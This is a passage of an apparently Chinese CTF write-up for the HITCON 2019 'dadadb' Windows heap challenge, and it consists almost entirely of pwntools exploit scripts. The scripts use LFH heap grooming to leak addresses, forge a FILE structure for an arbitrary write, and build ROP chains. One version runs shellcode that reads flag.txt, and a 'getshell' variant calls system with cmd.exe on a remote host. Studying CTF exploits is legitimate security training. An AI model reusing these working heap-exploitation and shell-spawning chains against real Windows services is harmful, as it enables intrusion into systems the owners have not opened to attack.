class="string">"lucas"</span>,<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x100</span>+fakechunk)</span><br><span class="line">add(<span class="string">"yy"</span>,<span class="number">0xf0</span>,<span class="string">'g\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------</span></span><br><span class="line">_fp = password + <span class="number">0x30</span></span><br><span class="line">_cnt = <span class="number">0</span></span><br><span class="line">_ptr = <span class="number">0</span></span><br><span class="line">_base = ret</span><br><span class="line">_flag = <span class="number">0x2080</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bufsize = <span class="number">0x100</span>+<span class="number">0x10</span></span><br><span class="line">obj = p64(_ptr) + p64(_base) + p32(_cnt) + p32(_flag) + p32(fd) + p32(<span class="number">0</span>) + p64(bufsize) +p64(<span class="number">0</span>)</span><br><span class="line">obj+= p64(<span class="number">0xffffffffffffffff</span>) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="string">"hh"</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">16</span> + p64(_fp) + p64(<span class="number">0</span>) + obj) <span class="comment"># overwrite fp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p64(_ptr)+p64(_base)</span></span><br><span class="line"><span class="string">p32(_cnt=0)+p32(_flag=0x2080)+p32(_file)+p32(_charbuf=0)</span></span><br><span class="line"><span class="string">p64(_bufsiz=0x110)+p64(0)</span></span><br><span class="line"><span class="string">p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0)</span></span><br><span class="line"><span class="string">p64(0)+p64(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">VirtualProtect = KERNEL32 + <span class="number">0x1b680</span></span><br><span class="line">ReadFile = KERNEL32 + <span class="number">0x22680</span></span><br><span class="line">pop_rdx_rcx_r8_r9_r10_r11 = ntdll + <span class="number">0x8fb20</span></span><br><span class="line">buf = binbase + <span class="number">0x5800</span></span><br><span class="line">rop = flat([pop_rdx_rcx_r8_r9_r10_r11,buf,hstdin,<span class="number">0x300</span>,buf<span class="number">-8</span>,<span class="number">0</span>,<span class="number">0</span>,ReadFile])</span><br><span class="line">rop+= flat([pop_rdx_rcx_r8_r9_r10_r11,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])  <span class="comment"># ReadFile会下溢,pop掉脏数据</span></span><br><span class="line">rop+= flat([pop_rdx_rcx_r8_r9_r10_r11,<span class="number">0x1000</span>,binbase+<span class="number">0x5000</span>,<span class="number">0x40</span>,buf<span class="number">-8</span>,<span class="number">0</span>,<span class="number">0</span>,VirtualProtect,buf])</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">raw_input()</span><br><span class="line">login(<span class="string">'da'</span>,<span class="string">'da'</span>) <span class="comment"># trigger fread to do arbitrary writing</span></span><br><span class="line">raw_input()</span><br><span class="line">p.send(rop.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)) <span class="comment"># overwrite return address with rop chain</span></span><br><span class="line"></span><br><span class="line">WriteFile = KERNEL32 + <span class="number">0x22770</span></span><br><span class="line">CreateFile = KERNEL32 + <span class="number">0x222f0</span></span><br><span class="line">GetStdHandle = KERNEL32 + <span class="number">0x1c890</span></span><br><span class="line"></span><br><span class="line">asm_str = <span class="string">'''</span></span><br><span class="line"><span class="string">sub rsp, 0x1000 ;// to prevent underflowing</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 0x7478742e67616c66;// flag.txt</span></span><br><span class="line"><span class="string">mov [rsp + 0x100],rax</span></span><br><span class="line"><span class="string">mov byte ptr [rsp + 0x108], 0</span></span><br><span class="line"><span class="string">lea rcx, [rsp + 0x100] </span></span><br><span class="line"><span class="string">mov edx, 0x80000000</span></span><br><span class="line"><span class="string">mov r8d, 1</span></span><br><span class="line"><span class="string">xor r9d, r9d</span></span><br><span class="line"><span class="string">mov dword ptr[rsp + 0x20], 3</span></span><br><span class="line"><span class="string">mov dword ptr[rsp + 0x28], 0x80</span></span><br><span class="line"><span class="string">mov [rsp + 0x30], r9</span></span><br><span class="line"><span class="string">mov rax, %d</span></span><br><span class="line"><span class="string">call rax ;// CreateFile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, rax</span></span><br><span class="line"><span class="string">lea rdx, [rsp + 0x200]</span></span><br><span class="line"><span class="string">mov r8d, 0x200</span></span><br><span class="line"><span class="string">lea r9, [rsp + 0x30]</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">mov [rsp + 0x20], rax</span></span><br><span class="line"><span class="string">mov rax, %d</span></span><br><span class="line"><span class="string">call rax ;// ReadFile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ecx, 0xfffffff5;  //STD_OUTPUT_HANDLE</span></span><br><span class="line"><span class="string">mov rax, %d</span></span><br><span class="line"><span class="string">call rax ;// GetStdHandle</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, rax</span></span><br><span class="line"><span class="string">lea rdx, [rsp + 0x200]</span></span><br><span class="line"><span class="string">mov r8d, [rsp + 0x30]</span></span><br><span class="line"><span class="string">lea r9, [rsp + 0x40]</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">mov [rsp + 0x20], rax</span></span><br><span class="line"><span class="string">mov rax, %d</span></span><br><span class="line"><span class="string">call rax ;// WriteFile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, %d</span></span><br><span class="line"><span class="string">call rax ;// exit</span></span><br><span class="line"><span class="string">'''</span> % (CreateFile,ReadFile,GetStdHandle,WriteFile,binbase+<span class="number">0x1B86</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(asm_str)</span><br><span class="line">raw_input()</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="getshell-exp："><a href="#getshell-exp：" class="headerlink" title="getshell_exp："></a>getshell_exp：</h2><p>真正的环境是限制了<code>getshell</code>的，所以<code>shellcode</code>才是正道，这里只是尝试一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(user)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(key,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)	</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(key)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line">	p.send(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login(<span class="string">'orange'</span>,<span class="string">'godlike'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Enable LFH</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    add(<span class="string">"\x01lays"</span>+str(i),<span class="number">0x90</span>,<span class="string">"fuck"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fill UserBlock</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>): </span><br><span class="line">    add(<span class="string">"\x02xxrw_"</span>+str(i),<span class="number">0x90</span>,<span class="string">"xxrw"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leave a hole</span></span><br><span class="line">delete(<span class="string">"\x02xxrw_15"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fill the hole with structure</span></span><br><span class="line">add(<span class="string">"\x02xxrw_14"</span>,<span class="number">0x60</span>,<span class="string">'\x14'</span>*<span class="number">0x70</span>) </span><br><span class="line">show(<span class="string">"\x02xxrw_14"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\x14'</span>*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">heapbase = u64(p.recv(<span class="number">8</span>)) &amp; <span class="number">0xffffffffffff0000</span></span><br><span class="line"><span class="keyword">if</span> heapbase == <span class="number">0</span>:</span><br><span class="line">	log.info(<span class="string">'bad luck...try again~~~'</span>)</span><br><span class="line">	exit()</span><br><span class="line">log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">p.recvuntil(p64(<span class="number">0x90</span>))</span><br><span class="line">key = p.recvuntil(<span class="string">"\x00"</span>)[:<span class="number">-1</span>]</span><br><span class="line">log.success(<span class="string">'next_key = '</span>+key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line">add(<span class="string">'\x02xxrw_14'</span>,<span class="number">0x60</span>,<span class="string">'\x14'</span>*<span class="number">0x70</span>+p64(heapbase+<span class="number">0x10</span>))</span><br><span class="line">show(key)</span><br><span class="line">dump = p.recvuntil(<span class="string">'orange'</span>)</span><br><span class="line">log.info(<span class="string">'check...'</span>)</span><br><span class="line"><span class="keyword">if</span> p32(<span class="number">0xffeeffee</span>) <span class="keyword">not</span> <span class="keyword">in</span> dump:</span><br><span class="line">	log.info(<span class="string">'bad luck...try again~~~'</span>)</span><br><span class="line">	exit()</span><br><span class="line">log.success(<span class="string">'success!!!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readmem</span><span class="params">(addr)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> key</span><br><span class="line">	add(<span class="string">'\x02xxrw_14'</span>,<span class="number">0x60</span>,<span class="string">'\x14'</span>*<span class="number">0x70</span>+p64(addr))</span><br><span class="line">	show(key)</span><br><span class="line">	p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">	<span class="keyword">return</span> u64(p.recvuntil(<span class="string">"orange"</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">_heap_lock = readmem(heapbase+<span class="number">0x2c0</span>)</span><br><span class="line">log.success(<span class="string">'_heap_lock = '</span>+hex(_heap_lock))</span><br><span class="line">ntdll = _heap_lock + (<span class="number">0x7ffcb0ad0000</span><span class="number">-0x7ffcb0c33d30</span>) - <span class="number">0x60</span></span><br><span class="line">log.success(<span class="string">'ntdll = '</span>+hex(ntdll))</span><br><span class="line">PebLdr_addr = ntdll + (<span class="number">0x7ffcb0c353c0</span>-ntdll)</span><br><span class="line">log.success(<span class="string">'PebLdr_addr = '</span>+hex(PebLdr_addr))</span><br><span class="line"></span><br><span class="line">immol = PebLdr_addr + <span class="number">0x20</span></span><br><span class="line">ldrdata = readmem(immol)</span><br><span class="line">binentry = readmem(ldrdata + <span class="number">0x28</span>)</span><br><span class="line">binbase = binentry<span class="number">-0x1e54</span><span class="number">-0x1c</span><span class="number">-0x40</span></span><br><span class="line">log.success(<span class="string">'binbase = '</span>+hex(binbase))</span><br><span class="line"></span><br><span class="line">ucrtbase = readmem(binbase+<span class="number">0x31D0</span>) - (<span class="number">0x7ffcad8f0760</span><span class="number">-0x00007ffcad870000</span>)</span><br><span class="line">log.success(<span class="string">'ucrtbase = '</span>+hex(ucrtbase))</span><br><span class="line">system = ucrtbase+(<span class="number">0x7ffcad91bba0</span><span class="number">-0x7ffcad870000</span>)</span><br><span class="line"></span><br><span class="line">Peb = readmem(PebLdr_addr-(<span class="number">0xc0</span><span class="number">-0x88</span>)) - <span class="number">0x340</span></span><br><span class="line">log.success(<span class="string">'Peb = '</span>+hex(Peb))</span><br><span class="line">Teb = Peb + <span class="number">0x1000</span></span><br><span class="line">log.success(<span class="string">'Teb = '</span>+hex(Teb))</span><br><span class="line"></span><br><span class="line">IAT = binbase + <span class="number">0x3000</span></span><br><span class="line">KERNEL32_ReadFile = readmem(IAT)</span><br><span class="line">KERNEL32 = KERNEL32_ReadFile - (<span class="number">0x0007ffcafb82680</span><span class="number">-0x7ffcafb60000</span>)</span><br><span class="line">log.success(<span class="string">'KERNEL32 = '</span>+hex(KERNEL32))</span><br><span class="line"></span><br><span class="line">stack_end = readmem(Teb+<span class="number">0x8</span>)</span><br><span class="line">log.success(<span class="string">'stack_end = '</span>+hex(stack_end))</span><br><span class="line">cookie = readmem(heapbase+<span class="number">0x88</span>)</span><br><span class="line">log.success(<span class="string">'cookie = '</span>+hex(cookie))</span><br><span class="line">processparameter = readmem(Peb+<span class="number">0x20</span>)</span><br><span class="line">hstdin = readmem(processparameter+<span class="number">0x20</span>)</span><br><span class="line">log.success(<span class="string">'hstdin = '</span>+hex(hstdin))</span><br><span class="line"></span><br><span class="line">password = binbase+<span class="number">0x5648</span></span><br><span class="line">start = stack_end<span class="number">-8</span></span><br><span class="line">ret = <span class="number">0</span></span><br><span class="line"><span class="comment">#ret_addr = binbase+0x1E38</span></span><br><span class="line">ret_addr = binbase+<span class="number">0x1b60</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'Begin Brute Force...Please wait...:)'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1000</span>/<span class="number">8</span>):</span><br><span class="line">    addr = start - <span class="number">8</span>*i</span><br><span class="line">    <span class="comment">#print i</span></span><br><span class="line">    v = readmem(addr)</span><br><span class="line">    <span class="keyword">if</span> v == ret_addr :</span><br><span class="line">        ret = addr</span><br><span class="line">        log.success(<span class="string">'find!!!'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> ret == <span class="number">0</span> :</span><br><span class="line">    exit()</span><br><span class="line">log.success(<span class="string">'ret_addr = '</span>+hex(ret))</span><br><span class="line"></span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x200</span>,<span class="string">"\x02"</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x100</span>,<span class="string">"\x03"</span>*<span class="number">0x100</span>)       <span class="comment">#A</span></span><br><span class="line">add(<span class="string">"david942j"</span>,<span class="number">0xf0</span>,<span class="string">"a"</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>)  <span class="comment">#B</span></span><br><span class="line">add(<span class="string">"mehqq"</span>,<span class="number">0xf0</span>,<span class="string">"qq"</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"mehqq2"</span>,<span class="number">0xf0</span>,<span class="string">"qq2"</span>*<span class="number">0x10</span>)         <span class="comment">#D</span></span><br><span class="line">add(<span class="string">"mehqq3"</span>,<span class="number">0xf0</span>,<span class="string">"qq3"</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">"mehqq2"</span>)                      <span class="comment">#free D</span></span><br><span class="line">delete(<span class="string">"david942j"</span>)                   <span class="comment">#free B</span></span><br><span class="line"></span><br><span class="line">show(<span class="string">"lucas"</span>)</span><br><span class="line">dump = p.recvuntil(<span class="string">"b"</span>*<span class="number">8</span>)[:<span class="number">-8</span>]</span><br><span class="line">david_fd = u64(dump[<span class="number">-16</span>:<span class="number">-8</span>])</span><br><span class="line">david_bk = u64(dump[<span class="number">-8</span>:])</span><br><span class="line">header = u64(dump[<span class="number">-24</span>:<span class="number">-16</span>])</span><br><span class="line">david = david_fd - <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'david_fd = '</span>+hex(david_fd))</span><br><span class="line">log.success(<span class="string">'david_bk = '</span>+hex(david_bk))</span><br><span class="line">log.success(<span class="string">'header = '</span>+hex(header))</span><br><span class="line">log.success(<span class="string">'david = '</span>+hex(david))</span><br><span class="line"></span><br><span class="line">fakechunk = p64(<span class="number">0</span>)+p64(header)+p64(password+<span class="number">0x10</span>)+p64(david_bk)</span><br><span class="line">logout()</span><br><span class="line"><span class="comment">#forge fake chunk in front of fp</span></span><br><span class="line">fake_User = <span class="string">'orange'</span>+<span class="string">'\x00'</span>*<span class="number">2</span>+p64(header)+p64(<span class="number">0xdeadbeef</span>)+p64(password+<span class="number">0x10</span>)[:<span class="number">-2</span>]</span><br><span class="line">fake_Password = <span class="string">'godlike'</span>+<span class="string">'\x00'</span>+p64(header)+p64(password<span class="number">-0x18</span>)+p64(david)[:<span class="number">-2</span>]</span><br><span class="line">login(fake_User,fake_Password)</span><br><span class="line">add(<span class="string">"lucas"</span>,<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x100</span>+fakechunk)</span><br><span class="line">add(<span class="string">"yy"</span>,<span class="number">0xf0</span>,<span class="string">'g\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------</span></span><br><span class="line">_fp = password + <span class="number">0x30</span></span><br><span class="line">_cnt = <span class="number">0</span></span><br><span class="line">_ptr = <span class="number">0</span></span><br><span class="line">_base = ret</span><br><span class="line">_flag = <span class="number">0x2080</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bufsize = <span class="number">0x100</span>+<span class="number">0x10</span></span><br><span class="line">obj = p64(_ptr) + p64(_base) + p32(_cnt) + p32(_flag) + p32(fd) + p32(<span class="number">0</span>) + p64(bufsize) +p64(<span class="number">0</span>)</span><br><span class="line">obj+= p64(<span class="number">0xffffffffffffffff</span>) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="string">"hh"</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">16</span> + p64(_fp) + p64(<span class="number">0</span>) + obj) <span class="comment"># overwrite fp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p64(_ptr)+p64(_base)</span></span><br><span class="line"><span class="string">p32(_cnt=0)+p32(_flag=0x2080)+p32(_file)+p32(_charbuf=0)</span></span><br><span class="line"><span class="string">p64(_bufsiz=0x110)+p64(0)</span></span><br><span class="line"><span class="string">p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0)</span></span><br><span class="line"><span class="string">p64(0)+p64(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">VirtualProtect = KERNEL32 + <span class="number">0x1b680</span></span><br><span class="line">ReadFile = KERNEL32 + <span class="number">0x22680</span></span><br><span class="line">pop_rdx_rcx_r8_r9_r10_r11 = ntdll + <span class="number">0x8fb20</span></span><br><span class="line">buf = binbase + <span class="number">0x5800</span></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">rop = flat([pop_rdx_rcx_r8_r9_r10_r11,<span class="number">0</span>,password,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,system])</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">login(<span class="string">'da'</span>,<span class="string">'cmd.exe\x00'</span>) <span class="comment"># trigger fread to do arbitrary writing</span></span><br><span class="line">raw_input()</span><br><span class="line">p.send(rop.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)) <span class="comment"># overwrite return address with rop chain</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="官方exp："><a href="#官方exp：" class="headerlink" title="官方exp："></a>官方exp：</h2><p><a href="https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/dadadb" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/dadadb</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span 